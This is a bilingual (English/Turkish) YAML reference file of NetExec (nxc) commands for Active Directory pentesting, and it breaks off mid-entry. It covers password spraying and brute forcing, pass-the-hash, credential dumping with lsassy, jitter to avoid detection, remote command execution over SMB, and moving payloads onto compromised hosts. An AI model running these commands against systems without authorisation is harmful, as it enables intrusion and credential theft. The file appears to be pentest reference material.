tool: nxc
tags: [network, windows, active-directory, smb, ldap, authentication, enumeration, exploitation, pentest, red-team]

actions:
  # ============================================================================
  # GETTING STARTED
  # ============================================================================
  
  - title:
      en: nxc - show help and available protocols
      tr: nxc - yardım ve desteklenen protokoller
    desc:
      en: |
        Display general help and list all available protocols. Shows SMB, SSH, LDAP,
        FTP, WMI, WinRM, RDP, VNC, MSSQL, and NFS protocols.
      tr: |
        Genel yardım ekranını görüntüler, desteklenen bütün protokolleri listeler: SMB, SSH, LDAP,
        FTP, WMI, WinRM, RDP, VNC, MSSQL ile NFS.
    command: "nxc --help"

  - title:
      en: nxc - show protocol help
      tr: nxc - protokol yardımını görüntüleme
    desc:
      en: |
        Display help for a specific protocol. Shows all available options and
        commands for the specified protocol.
      tr: |
        Belirli bir protokolün yardım ekranını görüntüler. Seçilen protokole özel bütün seçenekler
        ile komutlar listelenir.
    command: "nxc {{protocol|smb}} --help"

  - title:
      en: nxc - set thread count
      tr: nxc - eşzamanlı iş parçacığı sayısını ayarlama
    desc:
      en: |
        Set number of concurrent threads for scanning. Default is 100. Increase
        for faster scanning on large networks, decrease for stealth.
      tr: |
        Tarama sırasında kullanılacak eşzamanlı iş parçacığı sayısını belirler. Varsayılan değer 100.
        Geniş ağlarda hızlı tarama için artırılır, gizlilik gerektiğinde azaltılır.
    command: "nxc {{protocol|smb}} {{target}} -u {{user}} -p {{pass}} -t {{threads|50}}"

  - title:
      en: nxc - set timeout
      tr: nxc - zaman aşımı süresini ayarlama
    desc:
      en: |
        Set maximum timeout in seconds for each thread. Useful for slow networks
        or when dealing with unresponsive hosts.
      tr: |
        Her iş parçacığı için saniye cinsinden azami bekleme süresini belirler. Yavaş ağlarda
        ya da yanıt vermeyen makinelerle uğraşırken işe yarar.
    command: "nxc {{protocol|smb}} {{target}} --timeout {{timeout|30}}"

  - title:
      en: nxc - add jitter/delay
      tr: nxc - bağlantı aralarına rastgele gecikme ekleme
    desc:
      en: |
        Add random delay between connections to avoid detection. Format: single value
        or range (e.g., 2-5). Helps avoid rate limiting and detection.
      tr: |
        Bağlantılar arasına rastgele gecikme ekleyerek tespitten kaçınmayı sağlar. Tek değer ya da
        aralık biçiminde verilir (örneğin 2-5). Hız sınırlamasına takılmayı ile tespiti zorlaştırır.
    command: "nxc {{protocol|smb}} {{target}} --jitter {{jitter|3}}"

  - title:
      en: nxc - verbose output
      tr: nxc - ayrıntılı çıktı
    desc:
      en: |
        Enable verbose output for detailed information. Shows more details about
        connections, authentication attempts, and errors.
      tr: |
        Ayrıntılı çıktı üretir. Bağlantılar, kimlik doğrulama denemeleri ile hatalar hakkında
        daha fazla ayrıntı görüntülenir.
    command: "nxc {{protocol|smb}} {{target}} --verbose"

  - title:
      en: nxc - debug output
      tr: nxc - hata ayıklama çıktısı
    desc:
      en: |
        Enable debug level output. Shows maximum detail including low-level protocol
        information. Useful for troubleshooting.
      tr: |
        Hata ayıklama düzeyinde çıktı üretir. Protokol düzeyinde düşük seviye ayrıntılar dahil
        azami bilgi görüntülenir. Sorun gidermede işe yarar.
    command: "nxc {{protocol|smb}} {{target}} --debug"

  - title:
      en: nxc - disable progress bar
      tr: nxc - ilerleme çubuğunu kapatma
    desc:
      en: |
        Disable progress bar display. Useful when redirecting output to files or
        when running in automated scripts.
      tr: |
        İlerleme çubuğunu kapatır. Çıktı dosyaya yönlendirilirken ya da otomatik betikler içinde
        çalışırken işe yarar.
    command: "nxc {{protocol|smb}} {{target}} --no-progress"

  - title:
      en: nxc - show version
      tr: nxc - sürüm bilgisini görüntüleme
    desc:
      en: |
        Display nxc version information. Useful for checking installed version or
        reporting issues.
      tr: |
        Kurulmuş nxc sürüm bilgisini görüntüler. Sürüm denetimi ya da sorun bildirimi için işe yarar.
    command: "nxc --version"

  # Target Formats
  - title:
      en: nxc - scan single hostname
      tr: nxc - tek makine adını tarama
    desc:
      en: |
        Scan a single hostname. nxc will resolve the hostname to IP address
        automatically.
      tr: |
        Tek makine adını tarar. Makine adı IP adresine kendiliğinden çözümlenir.
    command: "nxc {{protocol|smb}} {{hostname|dc01.example.com}}"

  - title:
      en: nxc - scan single IP address
      tr: nxc - tek IP adresini tarama
    desc:
      en: |
        Scan a single IP address. Most common target format for direct IP scanning.
      tr: |
        Tek IP adresini tarar. Doğrudan IP taramasında en yaygın hedef biçimidir.
    command: "nxc {{protocol|smb}} {{ip|192.168.1.100}}"

  - title:
      en: nxc - scan multiple IPs
      tr: nxc - birden çok IP adresini tarama
    desc:
      en: |
        Scan multiple IP addresses separated by spaces. Efficient for scanning
        a small number of specific targets.
      tr: |
        Boşluklarla ayrılmış birden çok IP adresini tarar. Az sayıdaki belirli hedef için verimlidir.
    command: "nxc {{protocol|smb}} {{ip1|192.168.1.100}} {{ip2|192.168.1.101}}"

  - title:
      en: nxc - scan CIDR range
      tr: nxc - CIDR aralığını tarama
    desc:
      en: |
        Scan entire subnet using CIDR notation. Most efficient for scanning
        entire network ranges (e.g., /24 subnet).
      tr: |
        CIDR gösterimiyle bütün alt ağı tarar. Bütün ağ aralıklarını taramanın en verimli yoludur
        (örneğin /24 alt ağı).
    command: "nxc {{protocol|smb}} {{cidr|192.168.1.0/24}}"

  - title:
      en: nxc - scan IP range
      tr: nxc - IP aralığını tarama
    desc:
      en: |
        Scan IP address range using dash notation. Useful for scanning specific
        ranges without full subnet scanning.
      tr: |
        Tire gösterimiyle IP aralığını tarar. Bütün alt ağı taramadan belirli aralıkları taramada
        işe yarar.
    command: "nxc {{protocol|smb}} {{range|192.168.1.0-28}}"

  - title:
      en: nxc - scan from file
      tr: nxc - dosyadaki hedefleri tarama
    desc:
      en: |
        Scan targets from a file (one target per line). Supports hostnames, IPs,
        CIDR, and ranges. Most efficient for large target lists.
      tr: |
        Hedefleri dosyadan okur, her satırda bir hedef bulunur. Makine adı, IP, CIDR ile aralık
        desteklenir. Kalabalık hedef listeleri için en verimli yöntemdir.
    command: "nxc {{protocol|smb}} {{targets_file|~/targets.txt}}"

  # Credentials
  - title:
      en: nxc - authenticate with username and password
      tr: nxc - kullanıcı adı ve parolayla kimlik doğrulama
    desc:
      en: |
        Authenticate using username and password. Basic authentication method
        supported by all protocols. Wrap passwords with special characters in quotes.
      tr: |
        Kullanıcı adı ile parolayla kimlik doğrular. Bütün protokollerin desteklediği temel yöntemdir.
        Özel karakter içeren parolalar tırnak içine alınır.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}}"

  - title:
      en: nxc - authenticate with password containing special chars
      tr: nxc - özel karakter içeren parolayla kimlik doğrulama
    desc:
      en: |
        Authenticate with password containing special characters. Wrap in single
        quotes to prevent shell interpretation issues.
      tr: |
        Özel karakter içeren parolayla kimlik doğrular. Kabuk yorumlamasından kaynaklanan sorunları
        önlemek için parola tek tırnak içine alınır.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p '{{password|October2022!}}'"

  - title:
      en: nxc - authenticate with NTLM hash
      tr: nxc - NTLM karmasıyla kimlik doğrulama
    desc:
      en: |
        Authenticate using NTLM hash instead of password. Useful for pass-the-hash
        attacks. Format: LM:NT or just NT hash.
      tr: |
        Parola yerine NTLM karmasıyla kimlik doğrular. Hash ile geçiş saldırılarında işe yarar.
        Biçim: LM:NT ya da yalnız NT karması.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash}}"

  - title:
      en: nxc - authenticate with hash file
      tr: nxc - dosyadaki karmalarla kimlik doğrulama
    desc:
      en: |
        Authenticate using hashes from a file (one hash per line). Enables
        pass-the-hash attacks against multiple targets.
      tr: |
        Her satırda bir karma bulunan dosyadaki karmalarla kimlik doğrular. Birden çok hedefe hash
        ile geçiş saldırısını mümkün kılar.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash_file|hashes.txt}}"

  - title:
      en: nxc - authenticate with credential ID from database
      tr: nxc - veritabanındaki kimlik bilgisiyle kimlik doğrulama
    desc:
      en: |
        Use credentials from nxc database by credential ID. Automatically pulls
        credentials from database, saves typing. Can specify multiple IDs.
      tr: |
        Kimlik bilgisini kimlik numarasıyla veritabanından çeker. Kayıtlı bilgi kendiliğinden alınır,
        yeniden yazmaya gerek kalmaz. Birden çok numara belirtilebilir.
    command: "nxc {{protocol|smb}} {{target}} -id {{cred_id|1}}"

  - title:
      en: nxc - authenticate with multiple credential IDs
      tr: nxc - birden çok kayıtlı kimlik bilgisiyle kimlik doğrulama
    desc:
      en: |
        Use multiple credentials from database by IDs. Tests multiple credential
        sets from database against targets.
      tr: |
        Numaralarıyla veritabanından birden çok kimlik bilgisini dener. Veritabanındaki bilgi
        kümeleri hedeflere karşı sınanır.
    command: "nxc {{protocol|smb}} {{target}} -id {{id1|1}} {{id2|2}}"

  - title:
      en: nxc - multi-domain authentication
      tr: nxc - çoklu etki alanı ortamında kimlik doğrulama
    desc:
      en: |
        Authenticate in multi-domain environment. File contains usernames in
        DOMAIN\user format, one per line.
      tr: |
        Çoklu etki alanı ortamında kimlik doğrular. Dosyada her satırda ETKİALANI\kullanıcı
        biçiminde bir kullanıcı adı bulunur.
    command: "nxc {{protocol|smb}} {{target}} -u {{domain_users_file}} -p {{password}}"

  # Password Spraying & Brute Forcing
  - title:
      en: nxc - password spray single password
      tr: nxc - tek parolayla parola püskürtme
    desc:
      en: |
        Password spray single password against multiple usernames. Tests one
        password against multiple users. Watch for account lockouts!
      tr: |
        Tek parolayı birden çok kullanıcı adına karşı dener. Bir parola çok kullanıcıda sınanır.
        Hesap kilitlenmelerine dikkat edilir!
    command: "nxc {{protocol|smb}} {{target}} -u {{user1|user1}} {{user2|user2}} -p {{password|Summer18}}"

  - title:
      en: nxc - password spray from username file
      tr: nxc - dosyadaki kullanıcı adlarına parola püskürtme
    desc:
      en: |
        Password spray against usernames from file. One username per line. Tests
        single password against all users in file.
      tr: |
        Dosyadaki kullanıcı adlarına tek parolayı dener. Her satırda bir kullanıcı adı bulunur.
        Dosyadaki bütün kullanıcılar tek parolayla sınanır.
    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title:
      en: nxc - brute force single user
      tr: nxc - tek kullanıcıya kaba kuvvet saldırısı
    desc:
      en: |
        Brute force single username with multiple passwords. Tests multiple
        passwords against one user. Can lock accounts!
      tr: |
        Tek kullanıcı adına birden çok parolayı dener. Çok parola tek kullanıcıda sınanır.
        Hesapları kilitleyebilir!
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{pass1|pass1}} {{pass2|pass2}}"

  - title:
      en: nxc - brute force from password file
      tr: nxc - parola dosyasıyla kaba kuvvet saldırısı
    desc:
      en: |
        Brute force username with passwords from file. One password per line.
        Tests all passwords against single user.
      tr: |
        Dosyadaki parolalarla kullanıcı adını dener. Her satırda bir parola bulunur. Bütün parolalar
        tek kullanıcıda sınanır.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{passwords_file|~/passwords.txt}}"

  - title:
      en: nxc - brute force with user and password files
      tr: nxc - kullanıcı ve parola dosyalarıyla kaba kuvvet saldırısı
    desc:
      en: |
        Brute force with both user and password files. Tests all combinations.
        Result: user1=>pass1, user1=>pass2, user2=>pass1, etc. Very dangerous!
      tr: |
        Kullanıcı ile parola dosyalarını birlikte dener, bütün bileşimler sınanır. Sonuç:
        user1=>pass1, user1=>pass2, user2=>pass1 gibi. Son derece tehlikelidir!
    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}}"

  - title:
      en: nxc - password spray without bruteforce
      tr: nxc - birebir eşleşmeli parola püskürtme
    desc:
      en: |
        Password spray without bruteforce (1:1 mapping). Each user gets matched
        with corresponding password from file. user1=>pass1, user2=>pass2.
      tr: |
        Birebir eşleşmeli parola püskürtme yapar, kaba kuvvet uygulanmaz. Her kullanıcı dosyadaki
        karşılığıyla eşleşir: user1=>pass1, user2=>pass2.
    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"

  - title:
      en: nxc - password spray with continue on success
      tr: nxc - başarıda durmadan parola püskürtme
    desc:
      en: |
        Continue password spraying even after successful login. Useful for
        spraying single password against large user list. Incompatible with
        command execution.
      tr: |
        Başarılı girişte bile püskürtmeye devam eder. Tek parolayı kalabalık kullanıcı listesinde
        denerken işe yarar. Komut çalıştırmayla birlikte kullanılamaz.
    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}} --continue-on-success"

  - title:
      en: nxc - check username equals password
      tr: nxc - kullanıcı adı parolaya eşit mi denetimi
    desc:
      en: |
        Check if username equals password using same file. Tests if users have
        their username as password. Uses --no-bruteforce for 1:1 mapping.
      tr: |
        Kullanıcı adının parola olarak kullanılıp kullanılmadığını denetler. Kullanıcıların parolasının
        kullanıcı adıyla aynı olup olmadığı sınanır. Birebir eşleşme için --no-bruteforce kullanılır.
    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{users_file|~/users.txt}} --no-bruteforce --continue-on-success"

  - title:
      en: nxc - password spray with jitter
      tr: nxc - gecikmeli parola püskürtme
    desc:
      en: |
        Password spray with jitter to throttle requests. Helps avoid account
        lockouts and detection. Jitter works per-host basis.
      tr: |
        İstekleri yavaşlatmak için gecikmeli parola püskürtme yapar. Hesap kilitlenmelerinden ile
        tespitten kaçınmaya yardımcı olur. Gecikme her hedef için ayrı uygulanır.
    command: "nxc {{protocol|smb}} {{target}} --jitter {{jitter|3}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  # Kerberos
  - title:
      en: nxc - authenticate with Kerberos (password)
      tr: nxc - parolayla Kerberos kimlik doğrulaması
    desc:
      en: |
        Authenticate using Kerberos with password. Automatically handles TGT/ST
        ticket requests. Requires valid domain credentials.
      tr: |
        Parolayla Kerberos kimlik doğrulaması yapar. Bilet istekleri (TGT/ST) kendiliğinden
        karşılanır. Geçerli etki alanı bilgisi gerekir.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -k"

  - title:
      en: nxc - authenticate with Kerberos (hash)
      tr: nxc - karmayla Kerberos kimlik doğrulaması
    desc:
      en: |
        Authenticate using Kerberos with NTLM hash. Automatically handles TGT/ST
        ticket requests. Useful for pass-the-hash with Kerberos.
      tr: |
        NTLM karmasıyla Kerberos kimlik doğrulaması yapar. Bilet istekleri (TGT/ST) kendiliğinden
        karşılanır. Kerberos üzerinden hash ile geçiş için işe yarar.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash}} -k"

  - title:
      en: nxc - use existing Kerberos ticket
      tr: nxc - mevcut Kerberos biletini kullanma
    desc:
      en: |
        Use existing Kerberos ticket from ccache file. Set KRB5CCNAME environment
        variable to ticket file path. Useful when you already have valid tickets.
      tr: |
        ccache dosyasındaki mevcut Kerberos biletini kullanır. Bilet dosyasının yolu KRB5CCNAME ortam
        değişkeniyle belirtilir. Geçerli bilet zaten varken işe yarar.
    command: "export KRB5CCNAME={{ticket_file|/path/to/ticket.ccache}} && nxc {{protocol|smb}} {{target}} --use-kcache"

  - title:
      en: nxc - use Kerberos with kdcHost
      tr: nxc - özel KDC sunucusuyla Kerberos kullanma
    desc:
      en: |
        Use Kerberos with explicit KDC host. Required when domain name resolution
        fails or when specifying custom KDC server.
      tr: |
        Kerberos için KDC makinesini açıkça belirtir. Etki alanı adı çözümlenemediğinde ya da özel
        KDC sunucusu gerektiğinde kullanılır.
    command: "nxc {{protocol|ldap}} {{target}} -u {{username}} -p {{password}} -k --kdcHost {{kdc_host|dc01.example.com}}"

  # Modules
  - title:
      en: nxc - list available modules
      tr: nxc - kullanılabilir modülleri listeleme
    desc:
      en: |
        List all available modules for a protocol. Shows module names and brief
        descriptions. Essential for discovering module capabilities.
      tr: |
        Protokole ait bütün kullanılabilir modülleri listeler. Modül adları ile kısa açıklamalar
        görüntülenir. Modül yeteneklerini keşfetmek için temel adımdır.
    command: "nxc {{protocol|smb}} -L"

  - title:
      en: nxc - run module
      tr: nxc - modül çalıştırma
    desc:
      en: |
        Execute a module on target(s). Modules provide advanced functionality like
        credential dumping, lateral movement, etc.
      tr: |
        Hedeflerde modül çalıştırır. Modüller parola dökümü, yatay yayılım gibi gelişmiş işlevler sağlar.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module_name|lsassy}}"

  - title:
      en: nxc - show module options
      tr: nxc - modül seçeneklerini görüntüleme
    desc:
      en: |
        Display options for a specific module. Shows all configurable parameters
        and their descriptions.
      tr: |
        Belirli modülün seçeneklerini görüntüler. Bütün ayarlanabilir parametreler açıklamalarıyla
        listelenir.
    command: "nxc {{protocol|smb}} -M {{module_name|lsassy}} --options"

  - title:
      en: nxc - run module with options
      tr: nxc - seçeneklerle modül çalıştırma
    desc:
      en: |
        Execute module with custom options. Options specified in KEY=value format
        (msfvenom style). Multiple options separated by spaces.
      tr: |
        Modülü özel seçeneklerle çalıştırır. Seçenekler ANAHTAR=değer biçiminde (msfvenom tarzı),
        boşluklarla ayrılarak verilir.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module_name|lsassy}} -o {{option1|KEY1=value1}} {{option2|KEY2=value2}}"

  - title:
      en: nxc - run multiple modules
      tr: nxc - art arda birden çok modül çalıştırma
    desc:
      en: |
        Execute multiple modules in sequence. Each module specified with -M flag.
        Runs all specified modules against targets.
      tr: |
        Birden çok modülü art arda çalıştırır. Her modül -M bayrağıyla belirtilir. Belirtilen bütün
        modüller hedeflerde çalıştırılır.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module1|spooler}} -M {{module2|iis}} -M {{module3|lsassy}}"

  # Database
  - title:
      en: nxc - access database shell
      tr: nxc - veritabanı kabuğuna erişim
    desc:
      en: |
        Access nxc database shell (nxcdb). Interactive shell for querying and
        managing stored credentials, hosts, shares, etc.
      tr: |
        nxc veritabanı kabuğuna (nxcdb) erişir. Kayıtlı kimlik bilgileri, makineler, paylaşımlar gibi
        verileri sorgulayıp yönetmeyi sağlayan etkileşimli kabuktur.
    command: "nxcdb"

  - title:
      en: nxc - create workspace
      tr: nxc - çalışma alanı oluşturma
    desc:
      en: |
        Create new workspace in database. Workspaces separate different engagements
        or pentests. All data stored per workspace.
      tr: |
        Veritabanında yeni çalışma alanı oluşturur. Çalışma alanları farklı müşteri ya da sızma
        testlerini birbirinden ayırır. Bütün veriler çalışma alanı başına tutulur.
    command: "nxcdb > workspace create {{workspace_name|test}}"

  - title:
      en: nxc - switch workspace
      tr: nxc - çalışma alanı değiştirme
    desc:
      en: |
        Switch to different workspace. Changes active workspace for all operations.
        All subsequent nxc commands use this workspace.
      tr: |
        Farklı çalışma alanına geçer. Bütün işlemler için etkin alan değişir. Sonraki bütün nxc
        komutları bu alanı kullanır.
    command: "nxcdb > workspace {{workspace_name|default}}"

  - title:
      en: nxc - list workspaces
      tr: nxc - çalışma alanlarını listeleme
    desc:
      en: |
        List all available workspaces. Shows all created workspaces and indicates
        current active workspace.
      tr: |
        Bütün kullanılabilir çalışma alanlarını listeler. Oluşturulan alanlar görüntülenir, etkin
        alan işaretlenir.
    command: "nxcdb > workspace list"

  - title:
      en: nxc - access protocol database
      tr: nxc - protokole özel veritabanına erişim
    desc:
      en: |
        Access specific protocol's database. Each protocol has its own database
        with protocol-specific commands and data.
      tr: |
        Belirli protokole ait veritabanına erişir. Her protokolün kendine özel komutları ile verilerini
        tutan ayrı veritabanı bulunur.
    command: "nxcdb > proto {{protocol|smb}}"

  - title:
      en: nxc - export credentials from database
      tr: nxc - kimlik bilgilerini veritabanından dışa aktarma
    desc:
      en: |
        Export credentials from database to file. Supports simple or detailed
        formats. Useful for sharing or backup.
      tr: |
        Kimlik bilgilerini veritabanından dosyaya aktarır. Yalın ya da ayrıntılı biçim desteklenir.
        Paylaşım ya da yedek için işe yarar.
    command: "nxcdb ({{workspace|default}})({{protocol|smb}}) > export creds {{format|detailed}} {{filename|creds.csv}}"

  - title:
      en: nxc - export hosts from database
      tr: nxc - makine listesini veritabanından dışa aktarma
    desc:
      en: |
        Export hosts from database to file. Supports simple, detailed, or signing
        formats. Signing format exports only IPs where SMB signing is enabled.
      tr: |
        Makine listesini veritabanından dosyaya aktarır. Yalın, ayrıntılı ya da imzalama biçimi
        desteklenir. İmzalama biçimi SMB imzası etkin IP adreslerini dışa aktarır.
    command: "nxcdb ({{workspace|default}})({{protocol|smb}}) > export hosts {{format|detailed}} {{filename|hosts.csv}}"

  # Logging
  - title:
      en: nxc - log to file
      tr: nxc - çıktıyı dosyaya kaydetme
    desc:
      en: |
        Log command output to file. Logs only current command output. Useful
        for saving results of specific scans.
      tr: |
        Komut çıktısını dosyaya kaydeder. Yalnızca o anki komutun çıktısı yazılır. Belirli tarama
        sonuçlarını saklamada işe yarar.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --log {{log_file|~/nxc.log}}"

  # DNS Options
  - title:
      en: nxc - set DNS server
      tr: nxc - DNS sunucusunu elle belirleme
    desc:
      en: |
        Manually set DNS server for name resolution. Useful when default DNS
        doesn't resolve domain names correctly.
      tr: |
        Ad çözümlemesi için DNS sunucusunu elle belirler. Varsayılan DNS etki alanı adlarını doğru
        çözümleyemediğinde işe yarar.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-server {{dns_server|8.8.8.8}}"

  - title:
      en: nxc - set DNS timeout
      tr: nxc - DNS zaman aşımını ayarlama
    desc:
      en: |
        Set DNS resolution timeout in seconds. Increase for slow DNS servers
        or unreliable networks.
      tr: |
        DNS çözümleme bekleme süresini saniye cinsinden belirler. Yavaş DNS sunucuları ya da
        güvenilmez ağlar için artırılır.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-timeout {{timeout|5}}"

  - title:
      en: nxc - use TCP for DNS
      tr: nxc - DNS çözümlemesinde TCP kullanma
    desc:
      en: |
        Force TCP for DNS resolution instead of UDP. Useful when UDP DNS is
        blocked or unreliable.
      tr: |
        DNS çözümlemesinde UDP yerine TCP kullanmaya zorlar. UDP DNS engellendiğinde ya da
        güvenilmez olduğunda işe yarar.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-tcp"

  - title:
      en: nxc - enforce IPv6
      tr: nxc - IPv6 bağlantısını zorlama
    desc:
      en: |
        Force IPv6 for connections. Use when target only has IPv6 addresses
        or when testing IPv6 connectivity.
      tr: |
        Bağlantılarda IPv6 kullanmaya zorlar. Hedefte yalnız IPv6 adresi varken ya da IPv6 erişimi
        sınanırken kullanılır.
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -6"

  # ============================================================================
  # SMB PROTOCOL
  # ============================================================================

  - title:
      en: nxc smb - basic authentication
      tr: nxc smb - temel kimlik doğrulama
    desc:
      en: |
        Authenticate to SMB share with username and password. Checks if credentials
        are valid. Green output = success, Red = failure, Magenta = valid password
        but authentication failed.
      tr: |
        SMB paylaşımına kullanıcı adı ile parolayla kimlik doğrular. Bilginin geçerliliği sınanır.
        Yeşil çıktı başarı, kırmızı başarısızlık, mor renk geçerli parola ancak başarısız kimlik
        doğrulama demektir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}}"

  - title:
      en: nxc smb - authenticate domain user
      tr: nxc smb - etki alanı hesabıyla kimlik doğrulama
    desc:
      en: |
        Authenticate using domain account. Automatically detects domain from SMB
        connection. Shows domain\username on success.
      tr: |
        Etki alanı hesabıyla kimlik doğrular. Etki alanı SMB bağlantısından kendiliğinden algılanır.
        Başarıda etki alanı\kullanıcı adı görüntülenir.
    command: "nxc smb {{target}} -u {{domain|DOMAIN}}\\{{username}} -p {{password}}"

  - title:
      en: nxc smb - authenticate local user
      tr: nxc smb - yerel hesapla kimlik doğrulama
    desc:
      en: |
        Authenticate using local account. Use when target is not domain-joined or
        for local account testing.
      tr: |
        Yerel hesapla kimlik doğrular. Hedef etki alanına katılmamışken ya da yerel hesap
        sınanırken kullanılır.
    command: "nxc smb {{target}} -u {{username}} -p {{password}}"

  - title:
      en: nxc smb - authenticate with hash
      tr: nxc smb - karmayla kimlik doğrulama
    desc:
      en: |
        Authenticate using NTLM hash (pass-the-hash). Format: LM:NT or just NT hash.
        Useful when you have hashes but not plaintext passwords.
      tr: |
        NTLM karmasıyla kimlik doğrular (hash ile geçiş). Biçim: LM:NT ya da yalnız NT karması.
        Açık parola yokken karma varken işe yarar.
    command: "nxc smb {{target}} -u {{username}} -H {{hash|A29F7623FD11550DEF0192DE9246F46B}}"

  - title:
      en: nxc smb - password spray
      tr: nxc smb - parola püskürtme
    desc:
      en: |
        Password spray against SMB targets. Tests single password against multiple
        users. Watch for account lockouts! Use --continue-on-success to continue
        after finding valid credentials.
      tr: |
        SMB hedeflerine tek parolayla püskürtme yapar. Tek parola birden çok kullanıcıda sınanır.
        Hesap kilitlenmelerine dikkat edilir! Geçerli bilgi bulununca devam için
        --continue-on-success kullanılır.
    command: "nxc smb {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title:
      en: nxc smb - execute command
      tr: nxc smb - uzaktan komut çalıştırma
    desc:
      en: |
        Execute command on remote system via SMB. Requires admin privileges.
        Shows (Pwn3d!) when code execution succeeds. Most likely local admin.
      tr: |
        SMB üzerinden uzak sistemde komut çalıştırır. Yönetici yetkisi gerekir. Kod çalıştırma
        başarısında (Pwn3d!) görüntülenir. Büyük olasılıkla yerel yöneticidir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"

  - title:
      en: nxc smb - execute PowerShell command
      tr: nxc smb - PowerShell komutu çalıştırma
    desc:
      en: |
        Execute PowerShell command on remote system. Use -X flag with PowerShell
        commands. Useful for advanced Windows administration.
      tr: |
        Uzak sistemde PowerShell komutu çalıştırır. PowerShell komutları -X bayrağıyla verilir.
        Gelişmiş Windows yönetimi için işe yarar.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -X '{{ps_command|Get-Process}}'"

  - title:
      en: nxc smb - get file from remote
      tr: nxc smb - uzaktan dosya indirme
    desc:
      en: |
        Download file from remote SMB share. Downloads file from remote path to
        local path. Useful for extracting files from compromised systems.
      tr: |
        Uzak SMB paylaşımından dosya indirir. Uzak yoldaki dosya yerel yola alınır. Ele geçirilmiş
        sistemlerden dosya çıkarmada işe yarar.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|\\Windows\\Temp\\file.txt}} {{local_path|/tmp/file.txt}}"

  - title:
      en: nxc smb - put file to remote
      tr: nxc smb - uzak makineye dosya yükleme
    desc:
      en: |
        Upload file to remote SMB share. Uploads local file to remote path.
        Useful for transferring tools or payloads to compromised systems.
      tr: |
        Uzak SMB paylaşımına dosya yükler. Yerel dosya uzak yola gönderilir. Ele geçirilmiş
        sistemlere araç ya da yük aktarmada işe yarar.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|\\Windows\\Temp\\file.txt}}"

  - title:
      en: nxc smb - enumerate shares
      tr: nxc smb - paylaşımları listeleme
    desc:
      en: |
        Enumerate SMB shares and access permissions. Lists all available shares
        and shows which ones are accessible with current credentials.
      tr: |
        SMB paylaşımları ile erişim izinlerini listeler. Bütün paylaşımlar görüntülenir, o anki
        bilgiyle hangilerine erişilebildiği belirtilir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --shares"

  - title:
      en: nxc smb - spider shares
      tr: nxc smb - paylaşımlarda dosya taraması
    desc:
      en: |
        Recursively spider SMB shares to find files. Discovers files and folders
        in accessible shares. Useful for finding sensitive data.
      tr: |
        Paylaşımları özyineli tarayarak dosya bulur. Erişilebilen paylaşımlardaki dosya ile klasörler
        keşfedilir. Duyarlı veri aramada işe yarar.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --spider {{share|C$}} --spider-folder {{folder|Users}}"

  - title:
      en: nxc smb - enumerate domain users
      tr: nxc smb - etki alanı kullanıcılarını listeleme
    desc:
      en: |
        Enumerate domain users via SMB. Lists all users in the domain. Requires
        domain credentials.
      tr: |
        SMB üzerinden etki alanı kullanıcılarını listeler. Etki alanındaki bütün kullanıcılar
        görüntülenir. Etki alanı bilgisi gerekir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --users"

  - title:
      en: nxc smb - enumerate domain groups
      tr: nxc smb - etki alanı gruplarını listeleme
    desc:
      en: |
        Enumerate domain groups via SMB. Lists all groups in the domain and their
        members. Requires domain credentials.
      tr: |
        SMB üzerinden etki alanı gruplarını listeler. Etki alanındaki bütün gruplar üyeleriyle
        görüntülenir. Etki alanı bilgisi gerekir.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --groups"

  - title:
      en: nxc smb - enumerate logged on users
      tr: nxc smb - oturum açmış kullanıcıları listeleme
    desc:
      en: |
        Enumerate users currently logged on to target system. Shows active user
        sessions. Useful for identifying high-value targets.
      tr: |
        Hedef sistemde o sırada oturum açmış kullanıcıları listeler. Etkin kullanıcı oturumları
        görüntülenir. Değerli hedefleri belirlemede işe yarar.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --loggedon-users"

  - title:
      en: nxc smb - enumerate local groups
      tr: nxc smb - yerel grupları listeleme
    desc:
      en: |
        Enumerate local groups on target system. Shows local group membership.
        Useful for privilege escalation assessment.
      tr: |
        Hedef sistemdeki yerel grupları listeler. Yerel grup üyelikleri görüntülenir. Yetki yükseltme
        değerlendirmesinde işe yarar.
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --local-groups"

  - title:
      en: nxc smb - enumerate sessions
      tr: nxc smb - etkin SMB oturumlarını listeleme
    desc:
      en: |
